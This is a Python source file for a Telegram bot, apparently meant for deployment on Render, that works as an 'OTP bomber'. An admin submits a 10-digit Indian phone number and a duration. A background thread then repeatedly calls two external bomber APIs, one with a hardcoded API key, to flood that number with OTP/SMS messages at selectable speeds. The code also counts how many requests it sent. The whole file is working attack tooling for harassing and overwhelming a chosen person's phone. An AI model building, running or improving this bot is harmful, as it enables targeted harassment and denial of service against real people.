from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ConversationHandler, MessageHandler, filters
import requests
import asyncio
import threading
import time
import os

app = Flask(__name__)

# Required ENV vars (Render dashboard से set करो)
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))

# Bomber APIs from your file
API1 = "https://boomberxnexu.vercel.app/api?number={}&country=91&count=10"
API2 = "https://ft-bomber.onrender.com/bomb?num={}&count=10&api_key=Sp5En6lWIppHZfg9yvY-R5eHtpd3fCEF"

WAITING_NUMBER, WAITING_TIME = range(2)
active_attacks = {}
SPEED_MODES = {'1x': 0.5, '2x': 0.2, '5x': 0.05}

application = None

def bomber_loop(attack_id, number, duration_min, speed_key):
    """Core bomber logic - unlimited requests"""
    data = active_attacks[attack_id]
    end_time = time.time() + (duration_min * 60)
    delay = SPEED_MODES[speed_key]
    
    while time.time() < end_time and data.get('running', True):
        # Hit both APIs
        for api_template in [API1, API2]:
            try:
                url = api_template.format(number, 10)
                requests.get(url, timeout=5)
                data['total_requests'] = data.get('total_requests', 0) + 1
            except:
                pass  # Silent fail
        
        time.sleep(delay)
    
    data['running'] = False

async def start(update: Update, context):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Access denied")
        return
    
    keyboard = [
        [InlineKeyboardButton("🚀 START BOMBER", callback_data="bomber_start")],
        [InlineKeyboardButton("⚡ SPEED 1x", callback_data="speed_1x"),
         InlineKeyboardButton("⚡ SPEED 2x", callback_data="speed_2x")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "💀 OTP BOMBER BOT 💀

"
        "Choose attack mode:",
        reply_markup=markup
    )

async def bomber_start_cb(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text("📱 Enter 10-digit number:")
    return WAITING_NUMBER

async def get_number(update: Update, context):
    num = update.message.text.strip()
    
    if len(num) != 10 or not num.isdigit():
        await update.message.reply_text("10 digits only!")
        return WAITING_NUMBER
    
    context.user_data['target_num'] = num
    context.user_data['speed'] = context.user_data.get('speed', '1x')
    
    keyboard = [[InlineKeyboardButton("⏰ SET TIME", callback_data="set_duration")]]
    markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"Target: +91{num}
Speed: {context.user_data['speed']}

"
        "Click to set duration (minutes):",
        reply_markup=markup
    )
    return WAITING_TIME

async def set_duration_cb(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text("Enter minutes (1-60):")
    return WAITING_TIME

async def get_duration(update: Update, context):
    try:
        minutes = int(update.message.text.strip())
        if minutes < 1 or minutes > 60:
            await update.message.reply_text("1-60 only!")
            return WAITING_TIME
    except:
        await update.message.reply_text("Number only!")
        return WAITING_TIME
    
    num = context.user_data['target_num']
    speed = context.user_data['speed']
    
    # Unique attack ID
    attack_id = f"{update.effective_chat.id}_{int(time.time())}"
    
    active_attacks[attack_id] = {
        'number': num,
        'duration': minutes,
        'speed': speed,
        'chat_id': update.effective_chat.id,
        'start_time': time.time(),
        'total_requests': 0,
        'running': True
    }
    
    # Background bomber
    threading.Thread(
        target=bomber_loop,
        args=(attack_id, num, minutes, speed),
        daemon=True
    ).start()
    
    await update.message.reply_text(
        f"💣 *BOMBER LIVE* 💣

"
        f"📱 +91{num}
"
        f"⏱️ {minutes} minutes
"
        f"⚡ {speed} speed

"
        f"📊 Live stats:
"
        f"Requests: 0 | Time left: {minutes}:00

"
        f"*🛑 /stop* to cancel"
    )
    return ConversationHandler.END

async def speed_cb(update: Update, context):
    speed = update.callback_query.data.split('_')[1]
    context.user_data['speed'] = speed
    await update.callback_query.answer(f"Speed set: {speed}")

async def stats_cb(update: Update, context):
    running = [a for a in active_attacks.values() if a['running']]
    total_req = sum(a.get('total_requests', 0) for a in active_attacks.values())
    
    msg = (
        f"*📊 STATS*

"
        f"🔥 Running: {len(running)}
"
        f"📈 Total requests: {total_req}
"
        f"⚡ Current speed: {context.user_data.get('speed', '1x')}"
    )
    await update.callback_query.edit_message_text(msg)

async def stop(update: Update, context):
    stopped = 0
    chat_id_str = str(update.effective_chat.id)
    for attack_id in list(active_attacks):
        if chat_id_str in attack_id:
            active_attacks[attack_id]['running'] = False
            stopped += 1
    
    await update.message.reply_text(f"🛑 Stopped {stopped} attacks")

# Conversation handler
conv_handler = ConversationHandler(
    entry_points=[CallbackQueryHandler(bomber_start_cb, pattern="bomber_start")],
    states={
        WAITING_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_number)],
        WAITING_TIME: [CallbackQueryHandler(set_duration_cb, pattern="set_duration"),
                       MessageHandler(filters.TEXT & ~filters.COMMAND, get_duration)]
    },
    fallbacks=[CommandHandler('stop', stop)]
)

# Initialize app
application = Application.builder().token(TELEGRAM_TOKEN).build()
application.add_handler(CommandHandler('start', start))
application.add_handler(conv_handler)
application.add_handler(CallbackQueryHandler(speed_cb, pattern="speed_.*"))
application.add_handler(CallbackQueryHandler(stats_cb, pattern="stats"))
application.add_handler(CommandHandler('stop', stop))

# Webhook
@app.route(f'/{TELEGRAM_TOKEN}', methods=['POST'])
def webhook():
    global application
    update = Update.de_json(request.get_json(force=True), application.bot)
    asyncio.create_task(application.process_update(update))
    return 'OK'

@app.route('/health')
def health():
    return jsonify({'status': 'running', 'attacks': len(active_attacks)})

if __name__ == '__main__':
    app.application = application
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
